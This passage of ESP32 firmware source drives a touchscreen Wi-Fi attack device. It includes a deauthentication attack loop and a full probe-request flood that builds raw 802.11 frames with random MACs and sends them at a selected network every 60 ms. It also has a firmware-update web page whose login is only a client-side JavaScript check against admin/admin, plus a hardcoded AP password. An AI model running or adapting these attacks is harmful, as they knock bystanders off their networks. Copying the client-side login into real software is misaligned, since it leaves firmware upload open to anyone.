        if (ap_list) {
            free(ap_list);
            ap_list = nullptr;
        }

        network_count = bgCount;
        ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
        if (ap_list) {
            for (int i = 0; i < network_count; i++) {
                wifi_ap_record_t ap_record = {0};
                memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
                strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
                ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
                ap_record.rssi    = WiFi.RSSI(i);
                ap_record.primary = WiFi.channel(i);
                ap_record.authmode = WiFi.encryptionType(i);
                ap_list[i] = ap_record;
            }

            qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
        } else {

            network_count = 0;
        }
    } else {

        scanNetworks();
    }

    drawScanScreen();

    drawScanScreen();
}

void deautherLoop() {

    if (feature_active && isButtonPressed(BTN_SELECT)) {
        feature_exit_requested = true;
        return;
    }

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0;
            delay(3000);
            return;
        }

        if (current_time - last_packet_time >= 100 && attack_running) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "DARK-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("DARK-DIV");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) {
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}

namespace ProbeRequestFlood {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

// Larger row height = easier touch selection.
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of the bottom button bar (y=304..320)

static uint8_t probe_frame[128];
static const uint8_t probe_rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
static constexpr int networks_per_page = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;

static bool uiDrawn = false;

static uint8_t ssidLength(const wifi_ap_record_t *ap) {
    uint8_t len = 0;
    while (len < sizeof(ap->ssid) && ap->ssid[len] != '\0') {
        len++;
    }
    return len;
}

static void makeRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)random(256);
    }
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static uint16_t buildProbeFrame(const wifi_ap_record_t *ap, uint8_t channel, const uint8_t *srcMac) {
    uint16_t pos = 0;

    probe_frame[pos++] = 0x40;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;

    memset(&probe_frame[pos], 0xFF, 6);
    pos += 6;
    memcpy(&probe_frame[pos], srcMac, 6);
    pos += 6;
    memset(&probe_frame[pos], 0xFF, 6);
    pos += 6;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;

    uint8_t ssid_len = ssidLength(ap);
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = ssid_len;
    if (ssid_len > 0) {
        memcpy(&probe_frame[pos], ap->ssid, ssid_len);
        pos += ssid_len;
    }

    probe_frame[pos++] = 0x01;
    probe_frame[pos++] = sizeof(probe_rates);
    memcpy(&probe_frame[pos], probe_rates, sizeof(probe_rates));
    pos += sizeof(probe_rates);

    probe_frame[pos++] = 0x03;
    probe_frame[pos++] = 0x01;
    probe_frame[pos++] = channel;

    return pos;
}

static void sendProbeFrame() {
    uint8_t srcMac[6];
    makeRandomMac(srcMac);

    esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
    uint16_t frame_len = buildProbeFrame(&selectedAp, selectedChannel, srcMac);

    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, probe_frame, frame_len, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                             : FeatureUI::ButtonStyle::Secondary;
    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {

    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

    if (leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning...");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        int y = LIST_HEADER_Y;
        tft.setTextColor(GREEN);
        tft.setCursor(10, y);
        tft.println("Networks:");
        y += 20;

        int start_index = current_page * networks_per_page;
        int end_index = min(start_index + networks_per_page, network_count);

        for (int i = start_index; i < end_index && y < LIST_BOTTOM_Y; i++) {
            char buf[64];
            char ssid[12];
            strncpy(ssid, (char*)ap_list[i].ssid, 11);
            ssid[11] = '\0';
            if (strlen((char*)ap_list[i].ssid) > 11) strcat(ssid, "...");
            const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
            snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);
            tft.setCursor(10, y);
            tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
            tft.println(buf);
            y += LIST_ROW_H;
        }

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, (network_count + networks_per_page - 1) / networks_per_page);
        tft.setCursor(180, 50);
        tft.setTextColor(GREEN);
        tft.println(page_buf);
    }

    const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
    bool leftDisabled = false;
    const char* prevButton = "Prev";
    bool prevDisabled = attack_running || current_page == 0;
    const char* nextButton = "Next";
    bool nextDisabled = attack_running || (current_page + 1) * networks_per_page >= network_count;
    drawTabBar(leftButton, leftDisabled, prevButton, prevDisabled, nextButton, nextDisabled);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

void handleTouch() {
    int x, y;
    if (!readTouchXY(x, y)) return;

    bool redraw = false;
    if (selected_ap_index == -1) {
        const int listMaxY = LIST_FIRST_ROW_Y + (networks_per_page * LIST_ROW_H);
        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * networks_per_page);
            if (index >= 0 && index < network_count) {
                selected_ap_index = index;
                selectedAp = ap_list[index];
                selectedChannel = ap_list[index].primary;
                drawScanScreen();
                delay(50);
                drawAttackScreen();
            }
        } else if (!scanning && y >= 290 && y <= 320) {
            if (attack_running) {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Stop Attack", true, false);
                    attack_running = false;
                    last_packet_time = 0;
                    drawScanScreen();
                    delay(50);
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    drawButton(122, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                }
            } else {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    if (current_page > 0) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                } else if (x >= 183 && x <= 240) {
                    if ((current_page + 1) * networks_per_page < network_count) {
                        drawButton(178, 304, 57, 16, "Next", true, false);
                        current_page++;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    }
                }
            }
        }
    } else {
        if (y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (!attack_running) {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                delay(50);
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                delay(50);
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(100);
    }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 1) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void probeRequestFloodSetup() {

    tft.fillRect(0, 37, 240, 320, TFT_BLACK);

    setupTouchscreen();
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    attack_running     = false;
    selected_ap_index  = -1;
    current_page       = 0;
    scanning           = false;

    int bgCount = WiFi.scanComplete();
    if (bgCount > 0) {

        if (ap_list) {
            free(ap_list);
            ap_list = nullptr;
        }

        network_count = bgCount;
        ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
        if (ap_list) {
            for (int i = 0; i < network_count; i++) {
                wifi_ap_record_t ap_record = {0};
                memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
                strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
                ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
                ap_record.rssi    = WiFi.RSSI(i);
                ap_record.primary = WiFi.channel(i);
                ap_record.authmode = WiFi.encryptionType(i);
                ap_list[i] = ap_record;
            }

            qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
        } else {

            network_count = 0;
        }
    } else {

        scanNetworks();
    }

    drawScanScreen();

    drawScanScreen();
}

void probeRequestFloodLoop() {

    if (feature_active && isButtonPressed(BTN_SELECT)) {
        feature_exit_requested = true;
        return;
    }

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0;
            delay(3000);
            return;
        }

        if (current_time - last_packet_time >= 60 && attack_running) {
            sendProbeFrame();
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "DARK-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("DARK-DIV");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) {
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}

namespace FirmwareUpdate {

#define FIRMWARE_FILE "/firmware.bin"

const char* host = "esp32";

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BUTTON_WIDTH 230
#define BUTTON_HEIGHT 20
#define BUTTON1_X 5
#define BUTTON1_Y 50
#define BUTTON2_X 5
#define BUTTON2_Y 80

#define TAB_BUTTON_WIDTH 57
#define TAB_BUTTON_HEIGHT 16
#define TAB_LEFT_X 0
#define TAB_MIDDLE_X 117
#define TAB_RIGHT_X 177
#define TAB_Y 304

#define TS_MIN_X 300
#define TS_MAX_X 3800
#define TS_MIN_Y 300
#define TS_MAX_Y 3800

#define NETWORKS_PER_PAGE 15
#define NETWORK_Y_START 70
#define NETWORK_ROW_HEIGHT 15

#define PASSWORD_MAX_LENGTH 32
#define KEY_WIDTH 20
#define KEY_HEIGHT 20
#define KEY_SPACING 2
#define KEYBOARD_Y_OFFSET_START 60

WebServer server(80);

char selectedSSID[32] = "";
char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";

typedef struct {
  char ssid[32];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
} NetworkInfo;

const char* keyboardLayout[] = {
  "1234567890",
  "QWERTYUIOP",
  "ASDFGHJKL",
  "ZXCVBNM!@#"
};

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled);
void drawMenu();
bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH);
static void waitForTouchXY(int& x, int& y);
void performSDUpdate();
void drawNetworkList(int, int, NetworkInfo*, int);
bool selectWiFiNetwork();
void drawInputField();
void drawKeyboard();
bool enterWiFiPassword();
void performWebOTAUpdate();

const char* loginIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Login Page</title>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 1rem;
            color: #E0E0E0;
        }
        input[type='text'],
        input[type='password'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>ESP32 Login Page</h2>
        <form name='loginForm'>
            <div class='form-group'>
                <label for='userid'>Username:</label>
                <input type='text' name='userid' id='userid'>
            </div>
            <div class='form-group'>
                <label for='pwd'>Password:</label>
                <input type='password' name='pwd' id='pwd'>
            </div>
            <input type='submit' onclick='check(this.form); return false;' value='Login'>
        </form>
    </div>
    <script>
        function check(form) {
            if (form.userid.value == 'admin' && form.pwd.value == 'admin') {
                window.open('/serverIndex');
            } else {
                alert('Error Password or Username');
            }
        }
    </script>
</body>
</html>
)";

const char* serverIndex = R"(
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>ESP32 Firmware Update</title>
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>
    <style>
        body {
            background-color: #1A1A1A;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2A2A2A;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: #FFFFFF;
        }
        .form-group {
            margin-bottom: 1.5rem;
        }
        input[type='file'] {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid #4A4A4A;
            border-radius: 5px;
            background-color: #3A3A3A;
            color: #E0E0E0;
            font-size: 1rem;
            box-sizing: border-box;
            cursor: pointer;
        }
        input[type='file']::-webkit-file-upload-button {
            background-color: #4A4A4A;
            color: #E0E0E0;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='file']::-webkit-file-upload-button:hover {
            background-color: #5A5A5A;
        }
        input[type='submit'] {
            width: 100%;
            padding: 0.8rem;
            border: none;
            border-radius: 5px;
            background-color: #FFE221;
            color: #1A1A1A;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type='submit']:hover {
            background-color: #FFF14A;
        }
        #progress-container {
            margin-top: 1rem;
            width: 100%;
            background-color: #3A3A3A;
            border-radius: 5px;
            overflow: hidden;
        }
        #prg {
            width: 0%;
            height: 20px;
            background-color: #FFE221;
            text-align: center;
            line-height: 20px;
            color: #1A1A1A;
            border-radius: 5px;
            transition: width 0.3s ease-in-out;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h2>Firmware Update</h2>
        <form method='POST' action='#' enctype='multipart/form-data' id='upload_form'>
            <div class='form-group'>
                <input type='file' name='update'>
            </div>
            <input type='submit' value='Update'>
        </form>
        <div id='progress-container'>
            <div id='prg'>progress: 0%</div>
        </div>
    </div>
    <script>
        $('form').submit(function(e) {
            e.preventDefault();
            var form = $('#upload_form')[0];
            var data = new FormData(form);
            $.ajax({
                url: '/update',
                type: 'POST',
                data: data,
                contentType: false,
                processData: false,
                xhr: function() {
                    var xhr = new window.XMLHttpRequest();
                    xhr.upload.addEventListener('progress', function(evt) {
                        if (evt.lengthComputable) {
                            var per = evt.loaded / evt.total;
                            var percent = Math.round(per * 100);
                            $('#prg').css('width', percent + '%').text('progress: ' + percent + '%');
                        }
                    }, false);
                    return xhr;
                },
                success: function(d, s) {
                    console.log('success!');
                },
                error: function(a, b, c) {
                    console.log('error:', c);
                }
            });
        });
    </script>
</body>
</html>
)";

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

  static int iconX[ICON_NUM] = {10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
         case 0:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              feature_exit_requested = true;
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {

  tft.fillRect(0, TAB_Y, SCREEN_WIDTH, TAB_BUTTON_HEIGHT, FEATURE_BG);

  if (leftButton[0]) {
    drawButton(TAB_LEFT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, leftButton, false, leftDisabled);
  }
  if (prevButton[0]) {
    drawButton(TAB_MIDDLE_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, prevButton, false, prevDisabled);
  }
  if (nextButton[0]) {
    drawButton(TAB_RIGHT_X, TAB_Y, TAB_BUTTON_WIDTH, TAB_BUTTON_HEIGHT, nextButton, false, nextDisabled);
